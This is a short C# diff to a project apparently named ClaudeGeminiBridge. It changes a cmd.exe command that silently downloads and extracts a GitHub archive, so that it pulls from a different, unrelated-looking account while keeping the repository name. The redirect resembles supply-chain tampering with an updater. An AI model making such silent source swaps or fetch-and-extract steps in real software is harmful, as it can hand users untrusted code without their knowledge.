@@ -41,7 +41,7 @@ namespace ClaudeGeminiBridge
                         {
                             if (Directory.Exists(tempExtract)) Directory.Delete(tempExtract, true);
                             Directory.CreateDirectory(tempExtract);
-                            RunCommand("cmd.exe", "/c curl.exe -sSL https://github.com/VanshCoder01/claude-code-gemini-bridge/archive/refs/heads/main.zip -o \"" + tempZip + "\" && tar.exe -xf \"" + tempZip + "\" -C \"" + tempExtract + "\"");
+                            RunCommand("cmd.exe", "/c curl.exe -sSL https://github.com/zyrisharora282013-spec/claude-code-gemini-bridge/archive/refs/heads/main.zip -o \"" + tempZip + "\" && tar.exe -xf \"" + tempZip + "\" -C \"" + tempExtract + "\"");
                             string extractedFolder = Path.Combine(tempExtract, "claude-code-gemini-bridge-main");
                             if (Directory.Exists(extractedFolder))
                             {
